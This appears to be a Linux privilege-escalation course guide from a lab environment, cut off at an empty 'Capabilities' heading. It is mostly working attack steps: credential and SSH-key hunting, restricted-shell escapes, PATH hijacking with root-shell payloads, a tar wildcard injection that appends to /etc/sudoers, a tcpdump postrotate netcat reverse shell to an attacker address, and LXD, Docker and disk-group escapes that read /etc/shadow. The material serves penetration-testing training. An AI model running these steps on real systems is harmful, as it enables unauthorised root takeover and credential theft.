-rwxr-xr-x 1 root root 35344 May 19 2020 aa-exec
<SNIP>

/usr/sbin/:
-rwxr-xr-x 1 root root  3068 May 19 2020 aa-remove-unknown
-rwxr-xr-x 1 root root 60432 Nov 28 2019 acpid
<SNIP>
```

---

## GTFOBins

GTFOBins is a curated online database of Unix binaries that can be exploited by an attacker to bypass local security restrictions and escalate privileges. Each entry documents exactly how a particular binary can be abused — whether through SUID exploitation, sudo misconfigurations, file read/write capabilities, or shell spawning techniques. The practical approach during enumeration is to compare the list of installed packages and available binaries on the target system against the GTFOBins database to identify which binaries present on the system are potentially exploitable. The one-liner below automates this by fetching the GTFOBins API, extracting all documented binary names, and checking each one against the installed packages list. Any match printed by this command should be immediately investigated using the techniques documented on the GTFOBins website for that specific binary.

```bash
$ for i in $(curl -s https://gtfobins.org/api.json | jq -r ''.executables | keys[]''); \
  do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi; done

Check GTFO for: ab
Check GTFO for: apt
Check GTFO for: ar
Check GTFO for: awk
Check GTFO for: bash
Check GTFO for: bzip2
Check GTFO for: cat
Check GTFO for: cp
Check GTFO for: curl
Check GTFO for: dd
Check GTFO for: diff
<SNIP>
```

---

## Trace System Calls — strace

The strace tool on Linux-based systems allows you to track and analyze all system calls and signal processing made by a running program. It follows the complete flow of a program''s execution and shows how it accesses system resources, processes signals, and sends and receives data from the operating system. From a security perspective strace is valuable for monitoring what a binary does at runtime — particularly useful for identifying specific requests made to remote hosts using passwords or tokens embedded in the syscall arguments. It can also reveal what files a program opens, what network connections it makes, and what data it reads and writes. The output of strace can be written to a file for later offline analysis using the -o flag. This is particularly useful for analyzing SUID binaries or root-owned services to understand their behavior before attempting to exploit them.

```bash
$ strace ping -c1 10.129.112.20

execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], ...) = 0
access("/etc/suid-debug", F_OK) = -1 ENOENT
access("/etc/ld.so.preload", R_OK) = -1 ENOENT
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY) = 3
socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
connect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("10.129.112.20")}, 16) = 0
sendto(3, "...", 64, 0, {sa_family=AF_INET, sin_addr=inet_addr("10.129.112.20")}, 16) = 64
write(1, "64 bytes from 10.129.112.20: icmp_seq=...", 57) = 57
exit_group(0) = ?
```

---

## Configuration Files

Configuration files control how every service and application on the system behaves and they frequently contain sensitive information including database credentials, API keys, private tokens, internal hostnames, and file paths to restricted resources. The find command with -name *.conf -o -name *.config locates all configuration files across the entire filesystem. Even if you cannot read the directory containing a configuration file, Linux permissions allow reading the file directly if the file itself has read permissions for your user — so always attempt to read specific known config files even when directory listing is denied. Web application configurations are especially valuable as files like wp-config.php, .env, database.yml, and settings.py routinely contain plaintext database passwords that can then be reused across accounts. Administrators often copy credentials between config files for convenience.

```bash
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
-rw-r--r-- 1 root root  71 Nov 28 12:31 /run/NetworkManager/resolv.conf
-rw-r--r-- 1 root root  72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
<SNIP>
```

---

## Scripts

Shell scripts and other automation scripts on the system reveal internal processes, backup routines, database interactions, and credential usage that is not visible from the process list alone. Administrators often write scripts to automate maintenance tasks and leave them with overly permissive file permissions, or they call other binaries using relative paths instead of absolute paths. Either of these mistakes is directly exploitable. Finding scripts that run as root via cron or systemd timers that are world-writable — or that call writable binaries — provides a direct path to privilege escalation. The find command filtered for .sh files and excluding standard source code and snap directories gives a practical list of custom scripts worth examining. Also check the process list filtered for root to see which scripts are actively executing as root at the time of enumeration.

```bash
$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/home/htb-student/automation.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/init.d/hwclock.sh
<SNIP>
```

---

## Running Services by User

The ps aux command filtered for root shows every process currently running under the root user account. This is important because any process running as root that has a vulnerability — whether a buffer overflow, command injection, or insecure file handling issue — is a direct path to root-level code execution. Services running as root that are also reachable from the network are especially high-value targets. Custom binaries and scripts in unusual paths like /opt, /srv, or /home running as root are particularly interesting because they are likely in-house code with less security scrutiny than standard packaged software. Even looking at the exact binary paths and command-line arguments of root processes can reveal credentials passed as arguments, configuration file locations, or other useful information about how the service is configured.

```bash
$ ps aux | grep root

root    1   0.0  0.2 168196 11364 ? Ss 12:31 0:01 /sbin/init splash
root  378   0.5  0.4  62648 17212 ? S  12:31 0:00 /lib/systemd/systemd-journald
root  752   0.0  0.2  58780 10608 ? Ss 12:31 0:00 /usr/bin/VGAuthService
root  778   0.0  0.0  18052  2992 ? Ss 12:31 0:00 /usr/sbin/cron -f
root  784   0.4  0.5 273512 21680 ? Ss 12:31 0:00 /usr/sbin/NetworkManager --no-daemon
root  792   0.1  0.5  48244 20540 ? Ss 12:31 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher
root  793   1.3  0.2 239180 11832 ? Ss 12:31 0:00 /usr/lib/policykit-1/polkitd --no-debug
<SNIP>
```

---

## Credential Hunting

Credential hunting is the process of systematically searching the filesystem for stored usernames, passwords, keys, and tokens that can be used to escalate privileges or move laterally. Configuration files with extensions like .conf, .config, .xml, .ini, and .env are the most common locations. The /var directory typically contains the web root for whatever web server is running and web application config files in /var/www/ frequently contain database credentials in plaintext. WordPress installations store database credentials in wp-config.php under the DB_USER and DB_PASSWORD constants which can be extracted with a simple grep. The spool and mail directories can also contain sensitive messages with credentials. Any password found anywhere should immediately be tried against every user account on the system and every internal service — password reuse is the most reliable attack multiplier in real-world environments.

```bash
$ grep ''DB_USER\|DB_PASSWORD'' /var/www/html/wp-config.php

define( ''DB_USER'', ''wordpressuser'' );
define( ''DB_PASSWORD'', ''WPadmin123!'' );

$ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/boot/config-4.4.0-116-generic
<SNIP>
```

---

## SSH Keys

SSH private keys are among the most valuable artifacts you can find during privilege escalation enumeration because they allow passwordless authentication to other systems without needing to crack any hash or know any password. If you find a private key belonging to a more privileged user or an administrator you can use it to SSH back into the same box as that user or authenticate to other systems in the environment entirely. The ~/.ssh/ directory is the standard location to check but keys can be placed anywhere on the filesystem. Always check the known_hosts file alongside any SSH keys found — it contains a list of public key fingerprints for every host the user has previously connected to, giving you a direct map of what other systems this user accesses and are therefore reachable and worth targeting from this machine.

```bash
$ ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts

$ find / -name "id_rsa" 2>/dev/null
$ find / -name "*.pem" 2>/dev/null
$ cat ~/.ssh/known_hosts
```

---

## Moving On

At this point you have a thorough lay of the land covering OS version, kernel, CPU architecture, login shells, running services, user and group memberships, network topology, mounted filesystems, hidden files, configuration files, credentials, and SSH keys. The next focus shifts to permissions — what directories, scripts, and binaries your current user can read, write, or execute, and how those permissions can be abused to escalate privileges. It is worth running LinPEAS at this stage in any real-world assessment to catch anything that manual enumeration may have missed. However, manual enumeration skills remain essential because tools can be blocked by antivirus, fail on unusual systems, or be unavailable entirely. The goal is to develop a thorough and repeatable personal methodology and build your own cheat sheet of commands that works regardless of what automated tools are available on the target.

---

# Part 2: Restricted Shells, Sudo, Path, Wildcards, SUID, Capabilities & Privileged Groups

---

## Escaping Restricted Shells

A restricted shell is a type of shell that limits the user''s ability to execute commands. In a restricted shell the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system, or to provide a way for users to access only certain system features. The key thing to understand is that a restricted shell is not a security boundary by itself — it is a convenience control, and there are multiple well-known techniques to escape it. When you land on a system and find yourself in a restricted shell, the first task is to identify which shell it is, what commands are available, and what the specific restrictions are, so you can choose the right escape technique.

### RBASH

Restricted Bourne shell (rbash) is a restricted version of the Bourne shell which is a standard command-line interpreter in Linux. It limits the user''s ability to use certain features of the Bourne shell such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. When you are placed into rbash you will typically notice that cd does not work, you cannot set PATH, you cannot use absolute paths to execute commands outside a permitted list, and output redirection is often blocked. Identifying rbash is the first step — the shell prompt may say rbash or the command echo $SHELL may reveal /bin/rbash. Once identified you know which escape techniques to attempt.

### RKSH

Restricted Korn shell (rksh) is a restricted version of the Korn shell which is another standard command-line interpreter. The rksh shell limits the user''s ability to use certain features of the Korn shell such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment. Unlike rbash, rksh restrictions are slightly different in scope — it focuses more on preventing modification of shell functions and environment changes rather than directory traversal. Understanding which restricted shell you are in matters because the escape technique that works for rbash may not work for rksh. Always check echo $SHELL or echo $0 to identify the shell type as your first step when you suspect you are in a restricted environment.

### RZSH

Restricted Z shell (rzsh) is a restricted version of the Z shell which is the most powerful and flexible command-line interpreter of the three. The rzsh shell limits the user''s ability to use certain features of the Z shell such as running shell scripts, defining aliases, and modifying the shell environment. Because Z shell is the most feature-rich of the three, its restricted version also has the most complex set of restrictions. However, the very richness of the Z shell also means there are more potential escape paths if the restrictions are not configured perfectly. When in rzsh always try common escape paths such as spawning a subshell through an editor or using command substitution before attempting more complex techniques.

---

## Escaping — General Concept

The general concept of escaping a restricted shell means finding a way to break out of the restrictions imposed by the shell and gain access to a full unrestricted shell environment. Several methods exist and each one exploits a different gap in how the restricted shell implements its controls. The most important thing to understand is that restricted shells are only as strong as their configuration — a single misconfigured allowed command can be enough to escape entirely. The techniques available include command injection, command substitution, command chaining, environment variable manipulation, and shell functions. In enterprise networks administrators use restricted shells to control what contractors, external partners, and employees can do on Linux servers. Each user group gets a different shell matched to their access level, but all of them have potential escape paths if the configuration is not airtight.

### Command Injection

Command injection is a technique where you inject additional commands into an input that the restricted shell accepts, causing the shell to execute commands beyond what it was designed to allow. Imagine you are in a restricted shell that only permits the ls command with a fixed set of arguments. Even though you cannot directly run pwd, you can inject it as a subcommand within the argument of ls using backtick syntax. The shell processes the backtick expansion first, executing pwd, and then passes the result to ls. This allows you to run any command that is not directly blocked, as long as you can embed it inside a permitted command''s argument. This works because the restriction is on the command name typed directly, not on what gets evaluated inside arguments.

```bash
$ ls -l `pwd`
```

This causes pwd to execute first as a subcommand, then its output is passed as an argument to ls. You have now executed pwd even though the shell did not allow it directly.

### Command Substitution

Command substitution is another escape method that uses the shell''s own syntax for embedding one command''s output into another. The standard syntax uses backticks or the $() form. If the restricted shell processes either of these substitution forms without restriction, you can use them to execute arbitrary commands by wrapping them inside allowed commands or simply by using them directly if the shell''s parser evaluates them before applying restrictions. The key difference from command injection is that substitution specifically uses the shell''s built-in substitution mechanism rather than injecting into an argument string. If the shell allows any form of substitution it is effectively allowing arbitrary command execution because the substituted command runs with the same shell''s privileges before the restriction check happens.

```bash
$ echo $(cat /etc/passwd)
$ echo `whoami`
```

### Command Chaining

Command chaining involves using shell metacharacters to string multiple commands together on a single line so that the shell executes them in sequence. The most common metacharacters for this are the semicolon ; which runs the next command regardless of the previous command''s exit code, the pipe | which passes one command''s output as input to the next, && which runs the next command only if the previous succeeded, and || which runs the next command only if the previous failed. If the restricted shell allows any of these metacharacters in its input parsing, you can chain a permitted command together with a command that is not permitted. The restricted shell may only check the first token of the input line as the command name, missing the chained command entirely.

```bash
$ ls ; /bin/bash
$ ls | /bin/sh
$ ls && /bin/bash
```

### Environment Variables

Environment variable manipulation as an escape technique involves modifying or creating environment variables that the shell relies on when executing commands. The most commonly abused variable for this purpose is PATH itself. If the restricted shell uses the PATH variable to locate commands and you can modify PATH to point to a directory you control, you can place malicious scripts named the same as restricted commands in that directory and the shell will execute your version instead. Another exploitable variable is SHELL — some programs read the SHELL variable to decide what shell to spawn when needed, so changing SHELL to /bin/bash and then invoking one of those programs causes a full bash shell to be spawned. If the restricted shell allows export or variable assignment at all, this technique is worth trying immediately.

```bash
$ export PATH=/tmp:$PATH
$ export SHELL=/bin/bash
```

### Shell Functions

Shell functions as an escape technique involve defining a custom function with the same name as a restricted built-in command or a command you want to run, where the function body executes something the shell would normally block. If the restricted shell permits function definition with the function keyword or the shorthand name() { } syntax, and if it does not check function bodies against its restriction list, you can define a function called anything and inside it execute /bin/bash or any other command. This works because the restriction is applied at the command execution level based on command names typed directly, not on the contents of function bodies that get defined and then called.

```bash
$ function escape() { /bin/bash; }
$ escape
```

---

## Path Abuse

PATH is an environment variable that specifies the set of directories where an executable can be located. When you type a command like ls without a full absolute path, the shell looks through each directory listed in PATH from left to right until it finds a binary matching that name and executes it. PATH abuse as a privilege escalation technique works by inserting a directory you control at the beginning of the PATH so that when a privileged process calls a command by name without a full path, it finds and executes your malicious version of that command instead of the real one. You can check the current PATH with echo $PATH or env | grep PATH.

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

### How PATH Abuse Works in Practice

The core of PATH abuse is that if any SUID binary, sudo-allowed script, or cron job calls a command using a relative name instead of an absolute path like /bin/ls, you can hijack that call. The first thing to check when you discover a SUID binary or a sudo rule is whether the program internally calls other commands by relative name. You can check this by running strings on the binary and looking for command names without leading slashes. If you see something like cat or service or id being called without a full path, that is a PATH hijack candidate.

The attack works by placing a malicious script with the same name as the called command in a directory you control, then prepending that directory to PATH before executing the privileged binary. Adding . (the current directory) to PATH is a particularly common setup for this attack.

```bash
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now create a malicious script named the same as whatever command the privileged binary calls:

```bash
$ touch ls
$ echo ''/bin/bash -p'' > ls
$ chmod +x ls
```

When the SUID binary or sudo command runs and internally calls ls without a full path, it will find your malicious ls in the current directory first and execute it, spawning a privileged shell.

### Checking Writable Directories in PATH

An important step after identifying PATH abuse as a possible vector is to check whether any of the directories already listed in the victim user''s PATH are writable by you. If any directory in the PATH is world-writable or writable by your user, you do not need to modify PATH at all — you can simply drop your malicious script directly into that directory and it will be found automatically whenever any privileged process calls that command by relative name. To check write permissions on PATH directories:

```bash
$ echo $PATH | tr '':'' ''\n'' | while read dir; do
    ls -ld "$dir" 2>/dev/null
  done

drwxrwxrwx 2 root root 4096 Aug 31 /usr/local/sbin    <-- world writable, exploitable
drwxr-xr-x 2 root root 4096 Aug 31 /usr/local/bin
drwxr-xr-x 2 root root 4096 Aug 31 /usr/sbin
drwxr-xr-x 2 root root 4096 Aug 31 /usr/bin
```

If /usr/local/sbin is world-writable as shown above, you can place a script named service or id or whatever the target binary calls there and it will be picked up when any process running with elevated privileges executes that command by relative name.

### PATH Abuse via Script in a PATH Directory

If a script or binary is placed inside a directory that is already in PATH, it becomes executable from anywhere on the system just by typing its name without specifying its full path. This is demonstrated here with a script called conncheck placed in /usr/local/sbin:

```bash
$ pwd && conncheck
/usr/local/sbin
Active Internet connections (servers and established)
Proto  Local Address    Foreign Address   State    PID/Program
tcp    0.0.0.0:22       0.0.0.0:*         LISTEN   1189/sshd
```

Even when you move to a completely different directory like /tmp, the script still runs because the shell finds it in PATH:

```bash
$ pwd && conncheck
/tmp
Active Internet connections (servers and established)
Proto  Local Address    Foreign Address   State    PID/Program
tcp    0.0.0.0:22       0.0.0.0:*         LISTEN   1189/sshd
```

The practical attack: if you can write to any directory in PATH, place your malicious payload there named the same as a command called by a root-owned process.

### Demonstrating the Full PATH Abuse Attack

This demonstrates the complete PATH abuse attack from start to finish. First prepend . to PATH so the current directory is searched first. Then create a file called ls containing a payload and make it executable. When any privileged process in the same directory calls ls without a full path, your file runs instead of the real /bin/ls.

```bash
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ touch ls
$ echo ''echo "PATH ABUSE!!"'' > ls
$ chmod +x ls
$ ls
PATH ABUSE!!
```

Replace echo "PATH ABUSE!!" with /bin/bash -p or a reverse shell payload when targeting a real SUID binary or cron job.

---

## Wildcard Abuse

Wildcard abuse is a privilege escalation technique that exploits the way the shell expands wildcard characters before passing arguments to commands. When a command uses * as part of its arguments, the shell replaces * with a list of all filenames in the current directory before the command runs. This means that if you create files whose names look like command-line flags or options, those filenames will be interpreted as actual options by the command when the wildcard expands. The wildcard characters and their meanings are:

```
*    — matches any number of characters in a filename
?    — matches exactly one character
[ ]  — matches any single character listed inside the brackets
~    — expands to the current user''s home directory
-    — inside brackets, denotes a range of characters
```

### Wildcard Abuse via tar and Cron

The tar command is one of the most commonly exploited programs for wildcard abuse because it has options like --checkpoint and --checkpoint-action that allow executing arbitrary commands during the archive process. When a cron job uses tar with a wildcard like tar -zcf backup.tar.gz *, the shell expands * into all filenames in the directory before tar runs. If you create files whose names are --checkpoint=1 and --checkpoint-action=exec=sh root.sh, those filenames become command-line arguments to tar, triggering execution of your script. This works because tar''s option parsing does not distinguish between arguments passed on the command line and those that result from wildcard expansion. The cron job below runs every minute and is a perfect target:

```
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

**Step 1** — Create the payload script that adds your user to sudoers:

```bash
$ echo ''echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers'' > root.sh
```

**Step 2** — Create files named as tar options so the wildcard expansion passes them as arguments:

```bash
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1
```

**Step 3** — Verify the files were created correctly:

```bash
$ ls -la

-rw-rw-r-- 1 htb-student htb-student   1 Aug 31 23:11 --checkpoint=1
-rw-rw-r-- 1 htb-student htb-student   1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
-rw-rw-r-- 1 htb-student htb-student  60 Aug 31 23:11 root.sh
```

**Step 4** — Wait for the cron job to run, then check sudo privileges:

```bash
$ sudo -l

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL

$ sudo su -
root@NIX02:~#
```

---

## Special Permissions — SUID

The Set User ID upon Execution (setuid or SUID) permission bit allows a user to execute a binary with the permissions of the file''s owner rather than the permissions of the user who is running it. In practice this means that if a binary is owned by root and has the SUID bit set, any user who executes it will run it as root regardless of their own privilege level. The SUID bit appears as s in the owner execute position of the file''s permission string: -rwsr-xr-x. This is a legitimate feature used by programs like passwd that need root access to modify /etc/shadow on behalf of any user. However when SUID is set on a binary that has exploitable features — such as the ability to spawn a shell, read arbitrary files, or execute system commands — it becomes a direct privilege escalation vector.

### Finding All SUID Binaries

The first step with SUID privilege escalation is to find every binary on the system that has the SUID bit set. The find command below searches the entire filesystem for files owned by root with the SUID permission bit set and lists them with full permission details. Run this immediately after gaining a shell and save the output.

```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root  16728 Sep  1 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root  16728 Sep  1 /home/mrb3n/payroll
-rwsr-xr-x 1 root root  40152 Nov 30 /bin/mount
-rwsr-xr-x 1 root root  40128 May 17 /bin/su
-rwsr-xr-x 1 root root  44168 May  7 /bin/ping
-rwsr-xr-x 1 root root  23376 Jan 18 /usr/bin/pkexec
-rwsr-xr-x 1 root root 136808 Jul  4 /usr/bin/sudo
-rwsr-xr-x 1 root root  54256 May 17 /usr/bin/passwd
-rwsr-xr-x 1 root root 1588768 Aug 31 /usr/bin/screen-4.5.0
<SNIP>
```

### What to Do After Finding SUID Binaries

Finding the list of SUID binaries is only the first step. The next step is to analyse each one and determine if it can be exploited. There are three things to check for each SUID binary you find:

**Check write permissions on the SUID binary itself** — if you can write to a SUID binary owned by root, you can overwrite it with your own payload and it will execute as root when run:

```bash
$ ls -la /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588768 Aug 31 /usr/bin/screen-4.5.0

$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | \
  while read perms links owner group size date file; do
    if [ -w "$file" ]; then echo "WRITABLE SUID: $file"; fi
  done
```

**Check the binary against GTFOBins** — many standard SUID binaries have documented exploitation techniques on GTFOBins. If vim, find, python, nmap, env, bash, or similar tools appear with SUID set, they can be trivially exploited to get a root shell. Search the binary name on https://gtfobins.github.io with the SUID filter applied.

**Check what the binary calls internally** — use strings on the SUID binary to see if it calls other commands by relative name rather than absolute path. If it does, combine this with the PATH abuse technique above:

```bash
$ strings /home/htb-student/payroll | grep -v lib | grep -v "/"

service
cat
id
```

If service appears without a full path and the binary is SUID root, prepend your malicious service script to PATH and execute the SUID binary.

### SUID — SETGID Binaries

The Set-Group-ID (setgid) permission bit is similar to SUID but applies to group ownership instead of user ownership. A binary with the setgid bit set runs with the permissions of the group that owns it, regardless of what group the executing user belongs to. The setgid bit appears as s in the group execute position: -rwxr-sr-x. These binaries are found with a slightly different find command using permission mask 6000 which checks for both SUID and SGID simultaneously:

```bash
$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30 2017 /usr/lib/snapd/snap-confine
```

These files can be leveraged in exactly the same way as SUID binaries. Check them against GTFOBins, check for write permissions on the binary itself, and check what they call internally using strings.

---

## GTFOBins

GTFOBins is a curated public database of Unix binaries and scripts that can be used by an attacker to bypass security restrictions, escape restricted shells, escalate privileges, spawn reverse shell connections, and transfer files when those binaries are available with SUID, sudo, or capability permissions. The name stands for "Get The F*** Out Binaries." Every entry on the site documents the exact commands needed to abuse a specific binary under specific conditions — SUID, sudo, capabilities, file write, file read, and so on. In the context of SUID and sudo privilege escalation, GTFOBins is your primary reference after you have enumerated what is available on the target system. For example, apt-get with sudo can spawn a root shell through its Pre-Invoke hook:

```bash
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

The workflow is: enumerate SUID binaries and sudo rules → take each binary name → search GTFOBins → apply the documented technique for the specific permission context (SUID, sudo, capabilities). Familiarise yourself with as many GTFOBins entries as possible so you can immediately recognise exploitation opportunities when you see a binary name in a permission listing.

---

## Sudo Rights Abuse

Sudo privileges allow an account to run certain commands in the context of root or another user without switching to that user or requiring the root password. When sudo is invoked the system checks the /etc/sudoers file to determine whether the current user has the appropriate rights for the command they are trying to run. The /etc/sudoers file is configured by the system administrator and can be highly specific — allowing only one command — or dangerously broad. The very first command to run on any system after gaining a shell is sudo -l, which lists all sudo permissions the current user has. Entries marked NOPASSWD can be seen and used without knowing the user''s password at all, making them especially valuable for privilege escalation. A misconfigured sudo entry is one of the most common and reliable paths to root in real environments and CTF machines alike.

```bash
$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

### What to Do After Running sudo -l

After running sudo -l, you need to analyse each entry carefully. There are several scenarios and each has a different exploitation path:

**NOPASSWD with a specific binary** — you can run that binary as root without any password. Immediately search GTFOBins for that binary name with the sudo filter. If it appears, follow the documented technique. Common examples include find, vim, python, nmap, awk, perl, ruby, env, bash, and less.

**NOPASSWD with a script path** — check whether you have write permission on that script file itself. If you can write to the script that sudo allows you to run as root, you can replace its contents with your payload and then execute it via sudo to get a root shell:

```bash
$ sudo -l
(root) NOPASSWD: /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxr-x 1 root root 45 Aug 31 /opt/scripts/backup.sh    <-- world writable

$ echo ''/bin/bash -p'' > /opt/scripts/backup.sh
$ sudo /opt/scripts/backup.sh
root@NIX02:~#
```

**NOPASSWD with a binary that has dangerous flags** — the allowed binary may have features that can be used to execute arbitrary commands even when invoked under the specific path listed in sudoers. This is the tcpdump case where the -z postrotate-command flag allows executing any script when tcpdump rotates its capture file.

### Sudo Abuse via tcpdump Postrotate

When tcpdump is allowed via sudo, it can be abused through its -z postrotate-command option which executes a specified script every time the capture file rotates. This allows execution of arbitrary code as root. The technique works by creating a shell script with a reverse shell payload, then running tcpdump with flags that force an immediate rotation and specify your script as the postrotate command. AppArmor in recent Ubuntu distributions has restricted this specific vector but it remains viable on older systems and in many enterprise Linux environments where AppArmor is not deployed.

**Step 1** — Create the payload script:

```bash
$ cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

**Step 2** — Start netcat listener on your attack machine:

```bash
$ nc -lnvp 443
```

**Step 3** — Execute tcpdump with the postrotate abuse:

```bash
$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB
Maximum file limit reached: 1
```

**Step 4** — Root shell received:

```
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Sudo Best Practices to Know as an Attacker

Understanding the two key misconfigurations that make sudo entries exploitable helps you immediately recognise vulnerable entries when you see them in sudo -l output. First, if the sudoers entry specifies a binary without its full absolute path (writing cat instead of /bin/cat), it is vulnerable to PATH abuse — you can create a malicious script named cat in a directory prepended to PATH, and when sudo runs cat it will find and execute your version first. Second, overly broad sudo grants such as ALL or entire script directories are dangerous — always check if the specific allowed path is writable, and always cross-reference every binary on GTFOBins immediately.

Two rules to always check:

```
1. Is the binary in sudoers specified with an absolute path? No = PATH abuse possible.
2. Is the script or binary that sudo allows writable by you? Yes = overwrite it with your payload.
```

---

## Privileged Groups

Linux group membership is one of the most underestimated privilege escalation vectors. Certain groups grant permissions that are effectively equivalent to root access even though the user is not directly added to the sudoers file and does not appear to have elevated privileges. When you run id or read /etc/group, always check every group your user belongs to against this list. The groups that matter most for privilege escalation are LXD, Docker, Disk, and ADM. Each provides a completely different path to root or to sensitive data, and understanding how each one works means that when you see membership in any of these groups you can immediately execute the appropriate escalation technique without needing to look anything up.

### LXC / LXD

LXD is Ubuntu''s container manager, similar to Docker. Upon installation of LXD on an Ubuntu system, all users are automatically added to the lxd group. Membership in this group allows creating and managing containers. The privilege escalation technique works by creating a new privileged LXD container, mounting the host''s entire root filesystem into the container, and then spawning a shell inside the container where you have root access to the mounted host filesystem. This gives you complete read and write access to every file on the host including /etc/shadow, SSH keys, and any other sensitive data, all without needing a password.

**Step 1** — Confirm LXD group membership:

```bash
$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

**Step 2** — Unzip and import an Alpine Linux image:

```bash
$ unzip alpine.zip
$ cd 64-bit\ Alpine/
$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

**Step 3** — Initialise LXD with defaults:

```bash
$ lxd init
```

**Step 4** — Create a privileged container with security.privileged=true so the root user inside the container maps directly to root on the host:

```bash
$ lxc init alpine r00t -c security.privileged=true
```

**Step 5** — Mount the host root filesystem into the container:

```bash
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

**Step 6** — Start the container and get a root shell inside it:

```bash
$ lxc start r00t
$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)

~ # cd /mnt/root/root
~ # cat /mnt/root/etc/shadow
```

The entire host filesystem is now accessible at /mnt/root inside the container with full root privileges.

### Docker

Placing a user in the docker group is essentially equivalent to giving them unrestricted root-level access to the entire host filesystem without requiring a password. Members of the docker group can create new Docker containers and mount any directory from the host into those containers. The attack is simple: spin up a container with the host root directory mounted into it, then browse the mounted filesystem as root inside the container. This allows reading /etc/shadow for offline cracking, reading root''s SSH keys, writing new SSH keys for persistent access, or adding a privileged user directly to /etc/passwd and /etc/shadow.

```bash
$ id
uid=1001(user) gid=1001(user) groups=1001(user),999(docker)

$ docker run -v /root:/mnt -it ubuntu

root@container:/# id
uid=0(root) gid=0(root)

root@container:/# ls /mnt
.bash_history  .ssh  root.txt

root@container:/# cat /mnt/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
...
```

Mount /etc instead of /root to read and modify /etc/shadow and /etc/passwd for persistence.

### Disk

Users within the disk group have full raw read and write access to any block device in /dev, which includes /dev/sda1 the main disk device used by the operating system. This is dangerous because raw device access completely bypasses filesystem-level permission checks — you are reading and writing directly to the disk blocks, not going through the kernel''s permission enforcement. The tool debugfs provides an interactive filesystem debugger that works directly on block devices and can be used to read any file on the system including /etc/shadow. This is effectively root-level file access without ever needing a root shell.

```bash
$ id
uid=1001(user) gid=1001(user) groups=1001(user),6(disk)

$ debugfs /dev/sda1
debugfs: cat /etc/shadow
root:$6$salt$hashhashhashhash...:19000:0:99999:7:::
htb-student:$6$salt$hashhashhashhash...:19000:0:99999:7:::

debugfs: cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
...
```

### ADM

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant a root shell, but is highly valuable because system log files frequently contain sensitive data including credentials logged in error messages, authentication tokens, session information, and detailed records of what commands users and automated processes have been running. Reviewing logs can reveal cron job activity, what services are running and how they are configured, and in some cases plaintext passwords that applications accidentally wrote to their log output. Log review with adm group access is a reconnaissance step that often leads to other privilege escalation paths.

```bash
$ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

$ cat /var/log/auth.log | grep -i password
$ cat /var/log/apache2/error.log | grep -i pass
$ ls -la /var/log/
```

---

## Capabilities

